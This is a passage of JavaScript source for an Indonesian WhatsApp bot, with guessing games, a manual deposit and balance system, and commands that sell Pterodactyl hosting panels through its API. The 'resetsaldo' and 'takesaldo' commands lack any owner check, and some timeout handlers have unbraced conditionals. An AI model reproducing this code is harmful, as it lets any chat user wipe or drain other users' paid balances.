    TradzSigma.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
    delete tebakkabupaten[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkimia': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
TradzSigma.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
    tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
})
await sleep(60000)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.lambang)
    TradzSigma.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m)
    delete tebakkimia[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'asahotak': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
let result = anu[Math.floor(Math.random() * anu.length)]
TradzSigma.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
    tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    TradzSigma.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m)
    delete tebakasahotak[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'siapaaku':{
  if (!m.isGroup) return reply(mess.only.group)
  let users = global.db.users[m.sender]
	let timeout = 60000 
	let poin = 10000
	let id = m.chat 
	if (id in TradzSigma.siapaaku) return replyviex('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	 
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	TradzSigma.siapaaku[id] = [
	await replyviex(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (TradzSigma.siapaaku[id]) 
users.money -= 200
replyviex(`*GAME SIAPAKAH AKU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].money.toLocaleString()}*`)
	delete TradzSigma.siapaaku[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'susunkata':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 60000
	let poin = 10000
	let id = m.chat
	if (id in TradzSigma.susunkata) return replyviex('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
Tipe: ${json.tipe}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	TradzSigma.susunkata[id] = [
	await replyviex(`${caption}`),
	json, poin,
	setTimeout(() => {
replyviex(`*GAME SUSUN KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].money.toLocaleString()}*`)
	delete TradzSigma.susunkata[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tekateki':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 60000
	let users = global.db.users[m.sender]
	let poin = 10000
	let id = m.chat
	if (id in TradzSigma.tekateki) return replyviex('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Hadiah: ${poin} Money 💸
	`.trim()
	TradzSigma.tekateki[id] = [
	await replyviex(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (TradzSigma.tekateki[id]) 
users.money -= 200
replyviex(`*GAME TEKA-TEKI*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.users[sender].money.toLocaleString()}*`)
	delete TradzSigma.tekateki[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tebakbendera2': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
TradzSigma.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    TradzSigma.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m)
    delete tebakbendera2[m.sender.split('@')[0]]
}
}
break
case 'deposit':
case 'depo': {
  if (isBanned) return m.reply(`*You Have Been Banned*`)
  if (m.isGroup) return replyviex("Deposit hanya bisa dilakukan dalam private chat.");
  let linkQrisnya = { url: './library/data/image/payment/qris.jpg' };
  let caradeponya = `*Berikut Adalah Cara Deposit Manual!.*

Silahkan lakukan pembayaran dengan menggunakan QRIS ini.

Jika sudah melakukan transfer, harap kirim bukti dengan cara mengirim screenshot dengan caption,
${prefix}bukti JUMLAH/CATATAN

Contoh :
*${prefix}bukti 10000/Deposit Kak*

Saldo akan masuk ketika Owner menyetujui screenshot bukti transfer yang dikirim!.

Note :
Perhatian, untuk minimal deposit adalah ${formatmoney(minimaldeposit)}!. Pastikan Anda transfer untuk deposit diatas minimal transaksi. Terimakasih...!`
  TradzSigma.sendMessage(m.chat, { caption: caradeponya, image: linkQrisnya });
  break;
};
case 'resetsaldo': {
  try {
    const nomor = args[0];

    if (!nomor) {
      return await TradzSigma.sendMessage(m.chat, {
        text: "❌ Format salah.\nGunakan: *.resetsaldo nomor*\nContoh: *.resetsaldo 6281234567890*"
      });
    }

    const userId = nomor + '@s.whatsapp.net';

    let saldoDB;
    try {
      saldoDB = JSON.parse(fs.readFileSync('./source/src/saldo.json'));
    } catch {
      saldoDB = {};
    }

    saldoDB[userId] = 0;
    fs.writeFileSync('./source/src/saldo.json', JSON.stringify(saldoDB, null, 2));

    await TradzSigma.sendMessage(m.chat, {
      text: `✅ Saldo @${nomor} telah direset ke Rp0.`,
      mentions: [userId]
    });
  } catch (error) {
    console.error("Error on resetsaldo:", error);
    await TradzSigma.sendMessage(m.chat, {
      text: "❌ Terjadi kesalahan saat mereset saldo."
    });
  }
}
break;
case 'takesaldo': {
  try {
    const nomor = args[0];
    const jumlah = parseInt(args[1]);

    if (!nomor || isNaN(jumlah) || jumlah <= 0) {
      return await TradzSigma.sendMessage(m.chat, {
        text: "❌ Format salah.\nGunakan: *.takesaldo nomor nominal*\nContoh: *.takesaldo 6281234567890 1000*"
      });
    }

    const userId = nomor + '@s.whatsapp.net';

    let saldoDB;
    try {
      saldoDB = JSON.parse(fs.readFileSync('./source/src/saldo.json'));
    } catch {
      saldoDB = {};
    }

    if (!saldoDB[userId]) saldoDB[userId] = 0;

    if (saldoDB[userId] < jumlah) {
      return await TradzSigma.sendMessage(m.chat, {
        text: `❌ Saldo pengguna tidak mencukupi. Sisa saldo: Rp${saldoDB[userId].toLocaleString('id-ID')}`
      });
    }

    saldoDB[userId] -= jumlah;
    fs.writeFileSync('./source/src/saldo.json', JSON.stringify(saldoDB, null, 2));

    await TradzSigma.sendMessage(m.chat, {
      text: `✅ Saldo @${nomor} telah dikurangi sebesar Rp${jumlah.toLocaleString('id-ID')}.\n💰 Sisa saldo: Rp${saldoDB[userId].toLocaleString('id-ID')}`,
      mentions: [userId]
    });
  } catch (error) {
    console.error("Error on takesaldo:", error);
    await TradzSigma.sendMessage(m.chat, {
      text: "❌ Terjadi kesalahan saat mengurangi saldo."
    });
  }
}
break;
case 'bukti': {
  if (m.isGroup) return replyviex("Pembelian Panel Pterodactyl hanya bisa dilakukan dalam private chat.");
  if (isBanned) return m.reply(`*You Have Been Banned*`);
  if (!m.quoted) return m.reply("Gunakan cara reply pesan lalu ketik *.bukti nominal/catatan*");

  let depo = text.split("/")[0];
  let catatnya = text.split("/")[1];
  const userId = m.sender;

  let saldoDB;
  try {
    saldoDB = JSON.parse(fs.readFileSync('./source/src/saldo.json'));
  } catch {
    saldoDB = {};
  }

  if (!saldoDB[userId]) {
    saldoDB[userId] = 0;
    fs.writeFileSync('./source/src/saldo.json', JSON.stringify(saldoDB, null, 2));
  }

  const saldo = saldoDB[userId];
  if (!depo || !catatnya) return m.reply(`Gunakan dengan cara:\nKirim screenshot bukti transfer dengan caption *.bukti [nominal]/pesan*\n\nContoh:\n.bukti 10000/Topup mingguan`);

  depo = parseInt(depo);
  if (isNaN(depo)) return m.reply('Deposit harus berupa angka!');
  if (depo < minimaldeposit) return m.reply(`Minimal deposit adalah ${formatmoney(minimaldeposit)}.`);

  const owner = global.owner[0];
  const bukti = `*PERMINTAAN DEPOSIT SALDO*\n\n› Saldo saat ini: Rp${saldo.toLocaleString('id-ID')}\n› Deposit : ${formatmoney(depo)}\n› User : wa.me/${userId.replace("@s.whatsapp.net", "")}\n› Catatan : ${catatnya}\n\n*Pastikan bukti transfer valid sebelum klik tombol!*`;

  if (/image/.test(mime)) {
    let media = await quoted.download();
    await m.reply("Depositmu sedang diteruskan ke admin...");

    let sent = await TradzSigma.sendMessage(owner + "@s.whatsapp.net", {
      image: media,
      caption: bukti
    });

    const buktiId = sent.key.id;
    global.depositPending = global.depositPending || {};
    global.depositPending[buktiId] = {
      userId,
      amount: depo,
      note: catatnya // << simpan catatan
    };

    await TradzSigma.sendMessage(owner + "@s.whatsapp.net", {
      text: `${userId.replace("@s.whatsapp.net", "")} Menunggu konfirmasi saldo.`,
      footer: global.namabot,
      buttons: [{
        buttonId: `.konfirmdeposit ${buktiId}`,
        buttonText: { displayText: 'Confirm' },
        type: 1
      }],
      headerType: 1,
      viewOnce: true
    });
  }
  break;
}
case 'konfirmdeposit': {
  if (!TradID) return m.reply('Hanya owner yang bisa mengkonfirmasi deposit.');

  const buktiId = text.trim();
  if (!global.depositPending || !global.depositPending[buktiId]) return m.reply('ID bukti tidak valid atau sudah dikonfirmasi.');

  const { userId, amount, note } = global.depositPending[buktiId];
  let saldoDB = JSON.parse(fs.readFileSync('./source/src/saldo.json'));

  if (!saldoDB[userId]) saldoDB[userId] = 0;
  saldoDB[userId] += amount;

  fs.writeFileSync('./source/src/saldo.json', JSON.stringify(saldoDB, null, 2));
  delete global.depositPending[buktiId];

  await TradzSigma.sendMessage(userId, {
    text: `✅ *Deposit berhasil dikonfirmasi!*\n\n+Rp${amount.toLocaleString('id-ID')} telah ditambahkan ke saldomu.`
  });

  await m.reply(`Saldo Rp${amount.toLocaleString('id-ID')} berhasil ditambahkan ke ${userId.replace("@s.whatsapp.net", "")}`);

  const logChannel = global.my.idch;
  const logText = `💸 *LOG DEPOSIT TRADZ*\n\n› User: wa.me/${userId.replace("@s.whatsapp.net", "")}\n› Jumlah: Rp${amount.toLocaleString('id-ID')}\n› Oleh: ${m.sender.replace("@s.whatsapp.net", "")}\n› Hari: ${tanggal}\n\n› Catatan : ${note}\n\n*Terimakasih telah deposit*`;

  await TradzSigma.sendMessage(logChannel, { text: logText });

  break;
}
case 'belipanel': {
  if (m.isGroup) return replyviex("Pembelian Panel Pterodactyl hanya bisa dilakukan dalam private chat.");
  
  if (db.users[m.sender].status_deposit) 
    return replyviex("⚠️ Masih ada transaksi yang belum diselesaikan!\nKetik *.batalbeli* untuk membatalkan transaksi sebelumnya.");

  if (!text) return replyviex('Ketik kayak gini bro:\n.belipanel <namamu>\n\nContoh: .belipanel akuganteng');

  if (/\s/.test(text)) return replyviex("❌ Nama tidak boleh mengandung spasi!\nGunakan underscore (_) atau sambung langsung.\nContoh: .belipanel akuganteng");

  // Tandai status transaksi panel sedang berjalan
  db.users[m.sender].status_deposit = true;
  db.users[m.sender].pending_panel = text; // Simpan nama user juga (optional)

  return TradzSigma.sendMessage(m.chat, {
    text: `Halo *${pushname}*!\n\nSilakan pilih paket panel Pterodactyl yang kamu mau:`,
    footer: global.footer,
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.ownernumber + "@s.whatsapp.net"],
    },
    buttons: [
      {
        buttonId: 'panel_select',
        buttonText: { displayText: 'Pilih Paket Panel' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Paket Panel Pterodactyl',
            sections: [
              {
                title: 'List Paket Panel Tersedia',
                highlight_label: 'Paket Aktif',
                rows: [
                  { title: 'Buy 1GB', description: 'RAM 1GB | CPU 40%', id: `.buypanel ${text}|1gb` },
                  { title: 'Buy 2GB', description: 'RAM 2GB | CPU 60%', id: `.buypanel ${text}|2gb` },
                  { title: 'Buy 3GB', description: 'RAM 3GB | CPU 80%', id: `.buypanel ${text}|3gb` },
                  { title: 'Buy 4GB', description: 'RAM 4GB | CPU 100%', id: `.buypanel ${text}|4gb` },
                  { title: 'Buy 5GB', description: 'RAM 5GB | CPU 120%', id: `.buypanel ${text}|5gb` },
                  { title: 'Buy 6GB', description: 'RAM 6GB | CPU 140%', id: `.buypanel ${text}|6gb` },
                  { title: 'Buy 7GB', description: 'RAM 7GB | CPU 160%', id: `.buypanel ${text}|7gb` },
                  { title: 'Buy 8GB', description: 'RAM 8GB | CPU 180%', id: `.buypanel ${text}|8gb` },
                  { title: 'Buy 9GB', description: 'RAM 9GB | CPU 200%', id: `.buypanel ${text}|9gb` },
                  { title: 'Buy 10GB', description: 'RAM 10GB | CPU 220%', id: `.buypanel ${text}|10gb` },
                  { title: 'Buy Unlimited', description: 'RAM Unli | CPU Unli', id: `.buypanel ${text}|unli` }
                ]
              }
            ]
          })
        }
      }
    ]
  }, { quoted: m });
}
break;

/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
case "buyadp":
case "buyptp":
case "buyownp": {
  if (m.isGroup) return m.reply("Pembelian panel Pterodactyl hanya bisa di dalam private chat.");
  if (!text) return m.reply(example("username"));
  if (text.includes(" ")) return m.reply("Username tidak boleh memakai spasi!");

  const saldoData = JSON.parse(fs.readFileSync("./source/src/saldo.json"));
  const userId = m.sender;
  const userSaldo = saldoData[userId] || 0;

  let Obj = {};
  let us = crypto.randomBytes(2).toString("hex");
  Obj.username = text.toLowerCase() + us;

  switch (command) {
    case "buyownp":
      Obj.harga = global.ownp;
      Obj.namaPanel = "Owner Panel Pterodactyl";
      break;
    case "buyptp":
      Obj.harga = global.ptp;
      Obj.namaPanel = "Partner Panel Pterodactyl";
      break;
    default:
      Obj.harga = global.adp;
      Obj.namaPanel = "Admin Panel Pterodactyl";
      break;
  }

  if (userSaldo < Obj.harga) {
    return m.reply(`Saldo kamu tidak cukup!\nHarga: Rp${Obj.harga}\nSaldo kamu: Rp${userSaldo}`);
  }

  // Potong saldo
  saldoData[userId] = userSaldo - Obj.harga;
  fs.writeFileSync("./source/src/saldo.json", JSON.stringify(saldoData, null, 2));

  // Proses pembuatan akun
  let username = Obj.username;
  let email = username + "@gmail.com";
  let name = username.charAt(0).toUpperCase() + username.slice(1);
  let password = crypto.randomBytes(4).toString("hex");

  let f = await fetch(domain + "/api/application/users", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikey,
    },
    body: JSON.stringify({
      email: email,
      username: username.toLowerCase(),
      first_name: name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password: password,
    }),
  });

  let data = await f.json();
  if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));

  let user = data.attributes;
  var teks = `*Data Akun ${Obj.namaPanel} 📦*
*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}
*${global.domain}*

*Syarat & Ketentuan :*
• Expired akun 1 bulan
• Simpan data ini sebaik mungkin
• Jangan asal hapus server!
• Ketahuan maling sc, auto delete akun no reff!`;

  fs.writeFileSync("./akunpanel.txt", teks);
  await TradzSigma.sendMessage(m.chat, {
    document: fs.readFileSync("./akunpanel.txt"),
    fileName: "akunpanel.txt",
    mimetype: "text/plain",
    caption: teks
  }, { quoted: m });
  fs.unlinkSync("./akunpanel.txt");
}
break;
case 'buypanel': {
  if (m.isGroup) return replyviex("Jika ingin membeli panel silahkan beli di private chat.");
  
  if (!db.users[m.sender].status_deposit) 
    return m.reply("Kamu belum memulai pembelian panel. Ketik *.belipanel namamu* terlebih dahulu.");

  if (!text.includes("|")) {
    return replyviex("Format salah!\nGunakan: .buypanel <username>|<ram>\nContoh: .buypanel Tradz|4gb");
  }

  let [usernameRaw, ramInputRaw] = text.split("|");

  if (!usernameRaw || !ramInputRaw) {
    return m.reply("Format salah! Harap masukkan username dan pilihan RAM.");
  }

  let username = usernameRaw.trim();
  let ramInput = ramInputRaw
    .toLowerCase()
    .replace(/ram/gi, '')
    .replace(/\s+/g, '')
    .replace(/[^a-z0-9]/gi, '');

  // Harga RAM
  let hargaList = {
    "1gb": global.ram1gb,
    "2gb": global.ram2gb,
    "3gb": global.ram3gb,
    "4gb": global.ram4gb,
    "5gb": global.ram5gb,
    "6gb": global.ram6gb,
    "7gb": global.ram7gb,
    "8gb": global.ram8gb,
    "9gb": global.ram9gb,
    "10gb": global.ram10gb,
    "unlimited": global.ramUnli,
    "unli": global.ramUnli
  };

  if (!hargaList[ramInput]) {
    return replyviex("Pilihan RAM tidak valid!\nPilih dari: 1gb hingga 10gb atau unlimited");
  }

  let saldoPath = "./source/src/saldo.json";
  let saldoDB = JSON.parse(fs.readFileSync(saldoPath));
  let userSaldo = saldoDB[m.sender] || 0;
  let harga = hargaList[ramInput];

  if (userSaldo < harga) {
    return replyviex(`Saldo tidak mencukupi!\nHarga: Rp${harga.toLocaleString()}\nSaldo kamu: Rp${userSaldo.toLocaleString()}\nGunakan perintah .deposit untuk menambah saldo.`);
  }

  // Potong saldo
  saldoDB[m.sender] -= harga;
  fs.writeFileSync(saldoPath, JSON.stringify(saldoDB, null, 2));

  let isUnli = (ramInput === "unlimited" || ramInput === "unli");

  // Spesifikasi berdasarkan preset
  let specs = {
    "1gb": { disk: 1000, cpu: 50 },
    "2gb": { disk: 3000, cpu: 100 },
    "3gb": { disk: 6000, cpu: 150 },
    "4gb": { disk: 8000, cpu: 200 },
    "5gb": { disk: 10000, cpu: 250 },
    "6gb": { disk: 12000, cpu: 300 },
    "7gb": { disk: 14000, cpu: 350 },
    "8gb": { disk: 16000, cpu: 400 },
    "9gb": { disk: 18000, cpu: 450 },
    "10gb": { disk: 20000, cpu: 500 }
  };

  let ramValue = isUnli ? 0 : parseInt(ramInput.replace("gb", "")) * 1000;
  let diskValue = isUnli ? 0 : specs[ramInput].disk;
  let cpuValue = isUnli ? 0 : specs[ramInput].cpu;

  let email = username + "@gmail.com";
  let name = username.charAt(0).toUpperCase() + username.slice(1) + " Server";
  let password = username + crypto.randomBytes(2).toString("hex");

  let userCreate = await fetch(domain + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey,
    },
    body: JSON.stringify({
      email,
      username,
      first_name: name,
      last_name: "Server",
      language: "en",
      password,
    }),
  });

  let userData = await userCreate.json();
  if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));

  let user = userData.attributes;

  let serverCreate = await fetch(domain + "/api/application/servers", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey,
    },
    body: JSON.stringify({
      name,
      user: user.id,
      egg: parseInt(egg),
      docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
      startup: "npm start",
      environment: {
        INST: "npm",
        USER_UPLOAD: "0",
        AUTO_UPDATE: "0",
        CMD_RUN: "npm start",
      },
      limits: {
        memory: ramValue,
        swap: 0,
        disk: diskValue,
        io: 500,
        cpu: cpuValue,
      },
      feature_limits: {
        databases: 5,
        backups: 5,
        allocations: 2
      },
      deploy: {
        locations: [parseInt(loc)],
        dedicated_ip: false,
        port_range: []
      },
    }),
  });

  let serverData = await serverCreate.json();
  if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));

  let server = serverData.attributes;

  let teksPanel = `
📡 *ID Server*: ${server.id}
👤 *Username*: ${user.username}
🔐 *Password*: ${password}
🌐 *Spesifikasi Server*
- *RAM*: ${ramValue === 0 ? "Unlimited" : `${ramValue / 1000}GB`}
- *Disk*: ${diskValue === 0 ? "Unlimited" : `${diskValue / 1000}GB`}
- *CPU*: ${cpuValue === 0 ? "Unlimited" : `${cpuValue}%`}

*${global.domain}*

*Syarat & Ketentuan*:
- Expired panel: *1 bulan*
- Simpan data ini sebaik mungkin.
- *Garansi*: 15 hari (1x replace).
- *Claim garansi wajib membawa bukti chat pembelian.*
  `.trim();

  await TradzSigma.sendMessage(m.sender, { text: teksPanel });

  db.users[m.sender].status_deposit = false;
  db.users[m.sender].pending_panel = null;
}
break;

case 'batalbeli': {
  if (!db.users[m.sender].status_deposit) return replyviex("Tidak ada transaksi yang sedang berlangsung.");

  db.users[m.sender].status_deposit = false;
  db.users[m.sender].pending_panel = null;
  replyviex("Transaksi pembelian panel berhasil dibatalkan.");
}
break;
case 'ceksaldo': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
try {
const userId = m.sender;
let saldoDB;
try {
saldoDB = JSON.parse(fs.readFileSync('./source/src/saldo.json'));
} catch {
saldoDB = {}
}
if (!saldoDB[userId]) {
saldoDB[userId] = 0;
fs.writeFileSync('./source/src/saldo.json', JSON.stringify(saldoDB, null, 2));
}
const saldo = saldoDB[userId];
await TradzSigma.sendMessage(m.chat, { text: `*🛒 Cek Saldo Anda*
💰 *Saldo Anda:* Rp${saldo.toLocaleString('id-ID')}
👤 *Pengguna:* @${userId.split('@')[0]}
🗒 *Tanggal:* ${tanggal}
> *Bot Whatsapp JinshiMD*`, mentions: [userId] }, { quoted: qloc });
} catch (error) {
console.error("Error on .saldo:", error);
await TradzSigma.sendMessage(m.chat, { text: "❌ Terjadi kesalahan saat mengecek saldo. Silakan coba lagi nanti." 
});
}
}
break;
case "shopsaldo": {
  let teks = `
━━━━〔✨ *TradzSigma* ✨〕━━━━
👋 *Selamat Datang di TradzSigma!*
🛍️ *TradzSigma Melayani Berbagai Digital*  
💎 *Tempat untuk membeli layanan berkualitas*
━━━━━━━━━━━━━━━━━━━━━━

✨ *TradzSigma* ✨
_Digital Services Made Easy_

💳 *SALDO* (.deposit)
🖥️ *PANEL* 
- Regular (.belipanel)
- Admin (.beliadp) 
- Premium (.beliptp)
- Custom (.ownp)

💼 *RESELLER*
- Private (.buyseller 1)
- Public (.buyseller 2)
- Subdomain (.buyseller 3)

📩 *Order*: Type the command
⚡ Fast • Reliable • Affordable
`;
  await TradzSigma.sendMessage(m.chat, {
    image: fs.readFileSync("./library/data/media/Tradz.jpg"),
    caption: teks,
    footer: `*👤 Customer Service:*\n📞 wa.me/6283844671188`,
    headerType: 4
  }, { quoted: qloc });
}
break;
case 'addsaldo': {
if (!TradID) return m.reply("❌ Maaf, hanya owner yang dapat menggunakan perintah ini.");
// Validasi argumen input
const args = m.text.split(" ");
if (args.length < 3) {
return m.reply(`Penggunaan: ${prefix}addsaldo nomor nominal\n\nContoh: ${prefix}addsaldo 6282245415403 10000`);
}
// Ekstrak nomor dan nominal
const nomorUser = args[1];
const nominal = parseInt(args[2]);
const userJid = `${nomorUser}@s.whatsapp.net`;
// Validasi nomor hp
if (!/^\d+$/.test(nomorUser)) {
return m.reply("❌ Nomor hp harus berupa angka!");
}
// Validasi nominal
if (isNaN(nominal) || nominal <= 0) {
return m.reply("❌ Nominal saldo harus berupa angka positif!");
}
const saldoFilePath = "./source/src/saldo.json";
try {
// Baca file saldo
const saldoData = fs.existsSync(saldoFilePath)
? JSON.parse(fs.readFileSync(saldoFilePath, "utf-8"))
: {};
// Update saldo
if (saldoData[userJid]) {
saldoData[userJid] += nominal;
} else {
saldoData[userJid] = nominal;
}
let saldoteks = `✅ Berhasil menambahkan saldo:
📱 Pengguna: ${nomorUser}
💰 Nominal: Rp${nominal.toLocaleString()}
📊 Total Saldo Sekarang: Rp${saldoData[userJid].toLocaleString()}`
// Simpan perubahan saldo
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2));
await TradzSigma.sendMessage(m.chat, {
  text: saldoteks,
  footer: global.footer,
  buttons: [
{ buttonId: '.owner', buttonText: { displayText: 'Owner Tradx' }, type: 1,}, 
{
buttonId: 'action',
buttonText: { displayText: 'ini pesan interactiveMeta' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'message',
sections: [
{
title: 'Pilih Menu',
highlight_label: 'Saldo Menu',
rows: [
{ title: "CEK SALDO", description: "Untuk Cek Saldo Member Anda", id: `.ceksaldo`}, 
{ title: "PRODUK MENU", description: "Untuk Menampilkan Produk Menu", id: `.shopsaldo`},
]}]})}}],
  headerType: 1,
  viewOnce: true,
}, { quoted: m });
// Kirim notifikasi ke nomor yang bersangkutan
const notificationMessage = `💰 Informasi Saldo\n\nSaldo Anda telah ditambahkan:\n💵 Nominal: Rp${nominal.toLocaleString()}\n📊 Total Saldo Sekarang: Rp${saldoData[userJid].toLocaleString()}`;
await TradzSigma.sendMessage(`${nomorUser}@s.whatsapp.net`, {
text: notificationMessage
}, {quoted: qdev});
} catch (error) {
console.error("Error menambah saldo:", error);
m.reply("❌ Terjadi kesalahan saat menambah saldo.");
}
}
break
//==================================================================
case 'bratv10': {
  if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 `CARA DAFTAR` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')

  await TradzSigma.sendMessage(m.chat, {
    react: {
      text: "⏱️",
      key: m.key,
    }
  })

  const { createCanvas, registerFont } = require('canvas');
  const Jimp = require('jimp');
  const path = require('path');

  async function BratGenerator(teks) {
    const width = 1024;
    const height = 1024;
    const margin = 60;
    const wordSpacing = 60;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');

    ctx.fillStyle = 'white';
    ctx.fillRect(0, 0, width, height);

    const fontPath = path.join(__dirname, './lib/arialnarrow.ttf');
    registerFont(fontPath, { family: 'Narrow' });

    let fontSize = 300;
    ctx.textAlign = 'center';
    ctx.textBaseline = 'top';
    ctx.fillStyle = 'black';

    const words = teks.trim().split(/\s+/);
    let lines = [];

    const rebuildLines = () => {
      lines = [];
      let currentLine = '';
      for (let word of words) {
        let testLine = currentLine ? `${currentLine} ${word}` : word;
        let testWidth =
          ctx.measureText(testLine).width + (testLine.split(' ').length - 1) * wordSpacing;
        if (testWidth < width - 2 * margin) {
          currentLine = testLine;
        } else {
          lines.push(currentLine);
          currentLine = word;
        }
      }
      if (currentLine) lines.push(currentLine);
    };

    // Penyesuaian otomatis ukuran font berdasarkan tinggi dan lebar
    let fits = false;
    while (!fits && fontSize > 10) {
      ctx.font = `${fontSize}px Narrow`;
      rebuildLines();
      const totalHeight = lines.length * fontSize * 1.3;

      const lineWidths = lines.map(line =>
        line.split(' ').reduce((acc, word) => acc + ctx.measureText(word).width, 0) +
        (line.split(' ').length - 1) * wordSpacing
      );
      const maxLineWidth = Math.max(...lineWidths);

      if (totalHeight <= height - 2 * margin && maxLineWidth <= width - 2 * margin) {
        fits = true;
      } else {
        fontSize -= 2;
      }
    }

    // Render teks rata tengah
    const totalTextHeight = lines.length * fontSize * 1.3;
    let y = (height - totalTextHeight) / 2;

    for (let line of lines) {
